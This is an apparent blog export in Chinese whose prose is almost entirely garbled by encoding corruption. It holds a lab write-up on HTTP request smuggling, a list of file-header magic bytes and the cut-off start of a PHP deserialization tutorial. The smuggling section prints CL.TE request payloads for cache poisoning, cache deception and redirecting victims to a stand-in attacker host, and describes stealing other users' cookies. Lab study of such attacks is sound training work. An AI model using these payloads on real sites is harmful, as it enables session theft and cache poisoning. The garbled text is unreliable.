<h2 id="åˆ©ç”¨httpè¯·æ±‚èµ°ç§æ¼æ´"><a class="markdownIt-Anchor" href="#åˆ©ç”¨httpè¯·æ±‚èµ°ç§æ¼æ´"></a> åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ¼æ´</h2>
<h3 id="bypasså‰ç«¯æœåŠ¡å™¨å®‰å…¨éªŒè¯"><a class="markdownIt-Anchor" href="#bypasså‰ç«¯æœåŠ¡å™¨å®‰å…¨éªŒè¯"></a> Bypasså‰ç«¯æœåŠ¡å™¨å®‰å…¨éªŒè¯</h3>
<p><strong>åœºæ™¯</strong>ï¼šå‰ç«¯æœåŠ¡å™¨å¯¹æŸäº›é¡µé¢æ·»åŠ äº†è®¿é—®é™åˆ¶ï¼Œæ¯”å¦‚å®éªŒä¸­å¯¹adminé¡µé¢æ§åˆ¶åœ¨åªèƒ½æ˜¯åç«¯æœåŠ¡å™¨æ‰èƒ½è®¿é—®ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡HTTPèµ°ç§æ¼æ´æ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚</p>
<ul>
<li>CL-TE</li>
</ul>
<p>å®éªŒåœ°å€ï¼š<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p>å‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œå“åº”æ¶ˆæ¯åé¦ˆä¸å…è®¸é‡å¤header</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721213930.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721213930.png" alt="img"></a></p>
<p>äºæ˜¯ï¼ŒåŠ ä¸ªä¼ è¾“å­—ç¬¦æ•°é™åˆ¶ï¼Œå°†èµ°ç§åé¢çš„è¯·æ±‚å»æ‰ï¼Œå³å¯è®¿é—®/adminç•Œé¢äº†</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221139.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221139.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221407.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221407.png" alt="img"></a></p>
<p>å®Œæˆåˆ é™¤ç”¨æˆ·</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221816.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221816.png" alt="img"></a></p>
<ul>
<li>TE-CL</li>
</ul>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721223313.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721223313.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721223504.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721223504.png" alt="img"></a></p>
<h3 id="è·å–å‰ç«¯æœåŠ¡å™¨å¯¹è¯·æ±‚çš„é‡å†™æƒ…å†µ"><a class="markdownIt-Anchor" href="#è·å–å‰ç«¯æœåŠ¡å™¨å¯¹è¯·æ±‚çš„é‡å†™æƒ…å†µ"></a> è·å–å‰ç«¯æœåŠ¡å™¨å¯¹è¯·æ±‚çš„é‡å†™æƒ…å†µ</h3>
<p><strong>åœºæ™¯</strong>ï¼šå‰ç«¯æœåŠ¡å™¨é€šå¸¸åœ¨è¯·æ±‚æ·»åŠ åˆ°å…¶ä»–è¯·æ±‚å¤´ä¹‹å‰ï¼Œå…ˆå¯¹è¯·æ±‚è¿›è¡Œä¸€äº›é‡å†™ï¼Œç„¶åå†è½¬å‘ç»™åç«¯æœåŠ¡å™¨ã€‚ä¸€èˆ¬æ˜¯æ·»åŠ ä¸€äº›HTTP HEADERã€‚å¯ä»¥é€šè¿‡HTTPèµ°ç§è¯·æ±‚æ¥è·å–åˆ°è¿™äº›é‡å†™å†…å®¹ã€‚</p>
<p>ä½†èµ°ç§çš„å‰æéœ€å…·å¤‡ä¸€äº›æ¡ä»¶ï¼š</p>
<ul>
<li>å­˜åœ¨ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œä¼ å…¥å‚æ•°ä¼šå‚¨å­˜å¹¶å¯ä»¥è¢«æŸ¥çœ‹</li>
<li>å­˜åœ¨HTTPèµ°ç§è¯·æ±‚</li>
</ul>
<p>æ„é€ ä¸€ä¸ªchunkï¼ŒåŒ…å«ä¸€ä¸ªå®Œæ•´çš„postè¯·æ±‚ï¼ŒæŠŠå¯ä»¥å‚¨å­˜çš„å‚æ•°æ”¾åœ¨æœ€åã€‚å½“ç¬¬äºŒä¸ªè¯·æ±‚ä¼ é€’æ—¶ï¼Œåˆ™ä¼šæŠŠHTTP HEADERæ·»åŠ åœ¨å‚æ•°åé¢è€Œè¢«å­˜å‚¨ã€‚å°±å¯ä»¥è·å–åˆ°å‰ç«¯æœåŠ¡å™¨æ‰€æ·»åŠ çš„HTTP HEADERã€‚è¿™é‡Œéœ€è¦æ³¨æ„Content-Lengthä¸èƒ½è¶…è¿‡æ‰€ä¼ é€’æ•°æ®åŒ…çš„é•¿åº¦ï¼Œä¸ç„¶ä¼šå¯¼è‡´è¯·æ±‚å¤±è´¥</p>
<p>å°è¯•èµ°ç§è¯·æ±‚ç›´æ¥è®¿é—®/adminï¼Œå´è¿”å›å“åº”ä¿¡æ¯åªæœ‰ç®¡ç†å‘˜ç™»é™†æˆ–è€…ä»127.0.0.1è¯·æ±‚æ‰å¯ä»¥è®¿é—®</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724145918.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724145918.png" alt="img"></a></p>
<p>é¡µé¢ä¸Šæœ‰ä¸ªæœç´¢æ¡†ï¼Œè¾“å…¥ä»»æ„å†…å®¹ï¼Œä¼šåœ¨é¡µé¢ä¸Šè¿”å›å‡ºæ¥</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724150746.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724150746.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724150855.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724150855.png" alt="img"></a></p>
<p>äºæ˜¯åˆ©ç”¨è¿™ä¸ªæœç´¢å‚æ•°ï¼Œå°†å‰ç«¯æœåŠ¡å™¨é‡å†™è¯·æ±‚çš„æƒ…å†µå±•ç¤ºå‡ºæ¥ï¼Œå‘ç°äº† X-trnzSu-Ip è¯·æ±‚å¤´</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724151412.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724151412.png" alt="img"></a></p>
<p>äºæ˜¯åŠ å…¥èµ°ç§çš„è¯·æ±‚ï¼Œå†å°è¯•è®¿é—®/adminå‘ç°æˆåŠŸ</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724151656.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724151656.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724152230.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724152230.png" alt="img"></a></p>
<h3 id="è·å–å…¶ä»–ç”¨æˆ·çš„cookie"><a class="markdownIt-Anchor" href="#è·å–å…¶ä»–ç”¨æˆ·çš„cookie"></a> è·å–å…¶ä»–ç”¨æˆ·çš„cookie</h3>
<p>å‚è€ƒä¸Šä¸€ä¸ªå®éªŒï¼Œè¿™ä¸ªå®éªŒä¹Ÿæ˜¯é€šè¿‡è·å–HTTP HEADERæ¥è·å–å…¶ä»–ç”¨æˆ·çš„Cookieã€‚</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164032.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164032.png" alt="img"></a></p>
<h3 id="http-headerå¯¼è‡´çš„xss"><a class="markdownIt-Anchor" href="#http-headerå¯¼è‡´çš„xss"></a> HTTP headerå¯¼è‡´çš„XSS</h3>
<p><strong>åœºæ™¯</strong>ï¼šé€šå¸¸æƒ…å†µä¸‹ï¼ŒHTTP HEADERå¯¼è‡´çš„XSSæ˜¯ä¸å¥½åˆ©ç”¨çš„ï¼Œä½†æ˜¯é€šè¿‡HTTPèµ°ç§è¯·æ±‚ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTP HEADERï¼Œè¿›è€Œå°±å¯ä»¥åˆ©ç”¨è¿™ç±»HTTPå¤´å¯¼è‡´çš„XSSã€‚</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164602.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164602.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164644.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164644.png" alt="img"></a></p>
<h3 id="å°†é‡å®šå‘è½¬å˜ä¸ºä»»æ„é‡å®šå‘"><a class="markdownIt-Anchor" href="#å°†é‡å®šå‘è½¬å˜ä¸ºä»»æ„é‡å®šå‘"></a> å°†é‡å®šå‘è½¬å˜ä¸ºä»»æ„é‡å®šå‘</h3>
<p><strong>åœºæ™¯</strong>ï¼šè®¸å¤šåº”ç”¨ç¨‹åºæ‰§è¡Œç°åœºé‡å®šå‘ï¼Œå¹¶å°†ä¸»æœºåä»è¯·æ±‚çš„Hostæ ‡å¤´æ”¾å…¥é‡å®šå‘URLã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://normal-website.com/home/</span></span><br></pre></td></tr></table></figure>
<p>é€šå¸¸ï¼Œæ­¤è¡Œä¸ºè¢«è®¤ä¸ºæ˜¯æ— å®³çš„ï¼Œä½†æ˜¯å¯ä»¥åœ¨èµ°ç§è¯·æ±‚æ”»å‡»ä¸­åˆ©ç”¨å®ƒæ¥å°†å…¶ä»–ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨åŸŸã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="language-vbnet"></span></span><br><span class="line"><span class="language-vbnet"><span class="keyword">GET</span> /home HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Foo:</span> X</span></span><br></pre></td></tr></table></figure>
<p>èµ°ç§çš„è¯·æ±‚å°†è§¦å‘é‡å®šå‘åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œè¿™å°†å½±å“åç«¯æœåŠ¡å™¨å¤„ç†çš„ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker-website.com</span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://attacker-website.com/home/</span></span><br></pre></td></tr></table></figure>
<h3 id="ç¼“å­˜æŠ•æ¯’"><a class="markdownIt-Anchor" href="#ç¼“å­˜æŠ•æ¯’"></a> ç¼“å­˜æŠ•æ¯’</h3>
<ul>
<li>æ„é€ ä¸€ä¸ªé¡µé¢ä¸­å†™å…¥æ¶æ„çš„å†…å®¹ï¼Œæ¯”å¦‚å†™å…¥alert(document.cookie)</li>
<li>å‘é€è¯·æ±‚èµ°ç§çš„å†…å®¹</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-lab-id.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>129</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: anything</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>å†å¯»æ‰¾åˆ°ä¸€ä¸ªå¯ç”¨ç¼“å­˜çš„jsé¡µé¢ï¼ˆå¯ç”¨å¯¼è‡´xssçš„jsï¼‰è®¿é—®ã€‚é¡µé¢ä¼šè·³è½¬åˆ°æ¶æ„é¡µé¢ä¸­ï¼Œå¹¶ä¸”å°†æ¶æ„å†…å®¹ç¼“å­˜åˆ°æœåŠ¡å™¨ä¸Šã€‚</li>
<li>æ‰“å¼€ä¸»é¡µ â‡’ å¯¼è‡´xss</li>
</ul>
<h3 id="ç¼“å­˜æ¬ºéª—"><a class="markdownIt-Anchor" href="#ç¼“å­˜æ¬ºéª—"></a> ç¼“å­˜æ¬ºéª—</h3>
<p>ç¼“å­˜æ¬ºéª—ï¼šåœ¨Webç¼“å­˜æ¬ºéª—ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºå°†ä¸€äº›å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„æ•æ„Ÿå†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢æ­¤å†…å®¹ã€‚</p>
<ul>
<li>å¯»æ‰¾ä¸€ä¸ªå­˜åœ¨éšç§çš„é¡µé¢ï¼Œæ¯”å¦‚è¿™é‡Œçš„my-accountï¼Œå¹¶ä¸”é¡µé¢è¿”å›çš„å†…å®¹æ˜¯å¯ä»¥è¢«ç¼“å­˜çš„</li>
<li>å‘é€ä¸€ä¸ªèµ°ç§è¯·æ±‚ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚é™æ€èµ„æºçš„è¯·æ±‚ä¼šè·³è½¬åˆ°my-acountå¹¶æŠŠéšç§ä¿¡æ¯ç¼“å­˜</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-lab-id.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>42</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /my-account HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span>-Ignore: X</span></span><br></pre></td></tr></table></figure>
<ul>
<li>æ‰“å¼€éšç§æµè§ˆå™¨åŠ è½½ä¸»é¡µï¼Œç”¨Brupsuiteæœç´¢éšç§å†…å®¹çš„å…³é”®å­—ã€‚å¦‚æœæˆåŠŸçš„è¯å¯ä»¥åœ¨é™æ€èµ„æºä¸­æœç´¢åˆ°</li>
</ul>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724173247.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724173247.png" alt="img"></a></p>
<p>åŸç†æ˜¯èµ°ç§çš„è¯·æ±‚æŠŠä¸‹ä¸€ä¸ªè¯·æ±‚HTTPæ–¹æ³•é‚£ä¸€è¡Œæ³¨é‡Šï¼Œè¯·æ±‚ä¼šå˜ä¸ºï¼š</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> /<span class="keyword">private</span>/messages HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="symbol">Foo:</span> XGET /<span class="keyword">static</span>/some-image.png HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="symbol">Host:</span> vulnerable-website.com</span><br><span class="line"><span class="symbol">Cookie:</span> sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶å¤´æ ‡å‡†ç¼–ç </title>
    <url>/2022/11/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%87%E5%87%86%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<p>tips</p>
<span id="more"></span>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">JPEG (jpg)ï¼Œæ–‡ä»¶å¤´ï¼šFF D8 FF</span><br><span class="line">PNG (png)ï¼Œæ–‡ä»¶å¤´ï¼š89 50 4E 47     ã€å‚è€ƒï¼špngæ–‡ä»¶å¤´è¯¦è§£ã€‘89 50 4e 47 0d 0a 1a 0a</span><br><span class="line">GIF (gif)ï¼Œæ–‡ä»¶å¤´ï¼š47 49 46 38</span><br><span class="line">Windows Bitmap (bmp)ï¼Œæ–‡ä»¶å¤´ï¼š42 4D [å‚è€ƒï¼šbmpæ–‡ä»¶æ ¼å¼è¯¦è§£]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">pythonåç¼–è¯‘æ–‡ä»¶pycçš„å¤´ï¼š03 F3 0D 0A  </span><br><span class="line">pydçš„æ–‡ä»¶å¤´ï¼š4D 5A 90 00</span><br><span class="line">ZIP Archive (zip)ï¼Œæ–‡ä»¶å¤´ï¼š50 4B 03 04 asciiç éƒ¨åˆ†æ˜¯PKï¼Œå¯ä»¥ç›´æ¥æ ¹æ®PKåˆ¤æ–­æ˜¯zipæ–‡ä»¶</span><br><span class="line">docæ–‡ä»¶raræ–‡ä»¶: 52 61 72 21</span><br><span class="line">7zæ–‡ä»¶å¤´ï¼š37 7A BC AF 27 1C</span><br><span class="line">MS Word/Excel (xls.or.doc)ï¼Œæ–‡ä»¶å¤´ï¼šD0CF11E0</span><br><span class="line">CAD (dwg)ï¼Œæ–‡ä»¶å¤´ï¼š41433130</span><br><span class="line">Adobe Photoshop (psd)ï¼Œæ–‡ä»¶å¤´ï¼š38425053</span><br><span class="line">Rich Text Format (rtf)ï¼Œæ–‡ä»¶å¤´ï¼š7B5C727466</span><br><span class="line">XML (xml)ï¼Œæ–‡ä»¶å¤´ï¼š3C3F786D6C</span><br><span class="line">HTML (html)ï¼Œæ–‡ä»¶å¤´ï¼š68746D6C3E</span><br><span class="line">Email [thorough only] (eml)ï¼Œæ–‡ä»¶å¤´ï¼š44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)ï¼Œæ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)ï¼Œæ–‡ä»¶å¤´ï¼š2142444E</span><br><span class="line">MS Access (mdb)ï¼Œæ–‡ä»¶å¤´ï¼š5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)ï¼Œæ–‡ä»¶å¤´ï¼šFF575043</span><br><span class="line">Postscript (eps.or.ps)ï¼Œæ–‡ä»¶å¤´ï¼š252150532D41646F6265</span><br><span class="line">Adobe Acrobat (pdf)ï¼Œæ–‡ä»¶å¤´ï¼š255044462D312E</span><br><span class="line">Quicken (qdf)ï¼Œæ–‡ä»¶å¤´ï¼šAC9EBD8F</span><br><span class="line">Windows Password (pwl)ï¼Œæ–‡ä»¶å¤´ï¼šE3828596</span><br><span class="line">RAR Archive (rar)ï¼Œæ–‡ä»¶å¤´ï¼š52617221</span><br><span class="line">Wave (wav)ï¼Œæ–‡ä»¶å¤´ï¼š57415645</span><br><span class="line">AVI (avi)ï¼Œæ–‡ä»¶å¤´ï¼š41564920</span><br><span class="line">Real Audio (ram)ï¼Œæ–‡ä»¶å¤´ï¼š2E7261FD</span><br><span class="line">Real Media (rm)ï¼Œæ–‡ä»¶å¤´ï¼š2E524D46</span><br><span class="line">MPEG (mpg)ï¼Œæ–‡ä»¶å¤´ï¼š000001BA</span><br><span class="line">MPEG (mpg)ï¼Œæ–‡ä»¶å¤´ï¼š000001B3</span><br><span class="line">Quicktime (mov)ï¼Œæ–‡ä»¶å¤´ï¼š6D6F6F76</span><br><span class="line">Windows Media (asf)ï¼Œæ–‡ä»¶å¤´ï¼š3026B2758E66CF11</span><br><span class="line">MIDI (mid)ï¼Œæ–‡ä»¶å¤´ï¼š4D546864</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–</title>
    <url>/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>PHPååºåˆ—åŒ–çš„å­¦ä¹ æ€»ç»“ï¼Œè¿˜æœ‰å®è·µæ€»ç»“å—·QWQ</p>
<span id="more"></span>
<h1 id="ååºåˆ—åŒ–æ¼æ´"><a class="markdownIt-Anchor" href="#ååºåˆ—åŒ–æ¼æ´"></a> ååºåˆ—åŒ–æ¼æ´</h1>
<p>â€‹                                                                                                         --------------------------------<strong>TWe1v3</strong></p>
<h2 id="phpç±»å’Œå¯¹è±¡è¯¦è§£"><a class="markdownIt-Anchor" href="#phpç±»å’Œå¯¹è±¡è¯¦è§£"></a> PHPç±»å’Œå¯¹è±¡è¯¦è§£</h2>
<h3 id="ä¸€-phpç±»å’Œå¯¹è±¡"><a class="markdownIt-Anchor" href="#ä¸€-phpç±»å’Œå¯¹è±¡"></a> ä¸€ã€PHPç±»å’Œå¯¹è±¡</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//å®šä¹‰ä¸€ä¸ªç±»class Car &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span> = <span class="string">&#x27;æ‰‹æœº&#x27;</span>;    <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//å®ä¾‹åŒ–ä¸€ä¸ªcarå¯¹è±¡$car = new Car();$car-&gt;name = &#x27;iPhone&#x27;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®å¯¹è±¡çš„å±æ€§å€¼echo $car-&gt;getName();  //è°ƒç”¨å¯¹è±¡çš„æ–¹æ³• è¾“å‡ºå¯¹è±¡çš„åå­—</span></span><br></pre></td></tr></table></figure>
<h3 id="äºŒ-ç±»çš„å±æ€§"><a class="markdownIt-Anchor" href="#äºŒ-ç±»çš„å±æ€§"></a> äºŒã€ç±»çš„å±æ€§</h3>
<p>åœ¨ç±»ä¸­å®šä¹‰çš„å˜é‡ç§°ä¹‹ä¸ºå±æ€§ï¼Œé€šå¸¸å±æ€§è·Ÿæ•°æ®åº“ä¸­çš„å­—æ®µæœ‰ä¸€å®šçš„å…³è”ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç§°ä½œâ€œå­—æ®µâ€ã€‚å±æ€§å£°æ˜æ˜¯ç”±å…³é”®å­— publicï¼Œprotected æˆ–è€… private å¼€å¤´ï¼Œåé¢è·Ÿä¸€ä¸ªæ™®é€šçš„å˜é‡å£°æ˜æ¥ç»„æˆã€‚å±æ€§çš„å˜é‡å¯ä»¥è®¾ç½®åˆå§‹åŒ–çš„é»˜è®¤å€¼ï¼Œé»˜è®¤å€¼å¿…é¡»æ˜¯å¸¸é‡ã€‚</p>
<p>è®¿é—®æ§åˆ¶çš„å…³é”®å­—ä»£è¡¨çš„æ„ä¹‰ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>ï¼šå…¬å¼€çš„ <span class="keyword">protected</span>ï¼šå—ä¿æŠ¤çš„ <span class="keyword">private</span>ï¼šç§æœ‰çš„</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="comment">//å®šä¹‰å…¬å…±å±æ€§    public $name = &#x27;æ±½è½¦&#x27;;   </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//å®šä¹‰å—ä¿æŠ¤çš„å±æ€§    protected $corlor = &#x27;ç™½è‰²&#x27;;    </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//å®šä¹‰ç§æœ‰å±æ€§    private $price = &#x27;100000&#x27;;&#125;</span></span><br><span class="line"></span><br><span class="line">é»˜è®¤éƒ½ä¸º<span class="keyword">public</span>ï¼Œå¤–éƒ¨å¯ä»¥è®¿é—®ã€‚ä¸€èˆ¬é€šè¿‡-&gt;å¯¹è±¡æ“ä½œç¬¦æ¥è®¿é—®å¯¹è±¡çš„å±æ€§æˆ–è€…æ–¹æ³•ï¼Œå¯¹äºé™æ€å±æ€§åˆ™ä½¿ç”¨::åŒå†’å·è¿›è¡Œè®¿é—®ã€‚å½“åœ¨ç±»æˆå‘˜æ–¹æ³•å†…éƒ¨è°ƒç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<span class="variable language_">$this</span>ä¼ªå˜é‡è°ƒç”¨å½“å‰å¯¹è±¡çš„å±æ€§ã€‚</span><br><span class="line"></span><br><span class="line"><span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">echo</span> <span class="variable">$car</span>-&gt;name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨å¯¹è±¡çš„å±æ€§echo $car-&gt;color;  //é”™è¯¯ å—ä¿æŠ¤çš„å±æ€§ä¸å…è®¸å¤–éƒ¨è°ƒç”¨echo $car-&gt;price;  //é”™è¯¯ ç§æœ‰å±æ€§ä¸å…è®¸å¤–éƒ¨è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line">å—ä¿æŠ¤çš„å±æ€§ä¸ç§æœ‰å±æ€§ä¸å…è®¸å¤–éƒ¨è°ƒç”¨ï¼Œåœ¨ç±»çš„æˆå‘˜æ–¹æ³•å†…éƒ¨æ˜¯å¯ä»¥è°ƒç”¨çš„ã€‚</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;    <span class="keyword">private</span> <span class="variable">$price</span> = <span class="string">&#x27;1000&#x27;</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPrice</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="variable 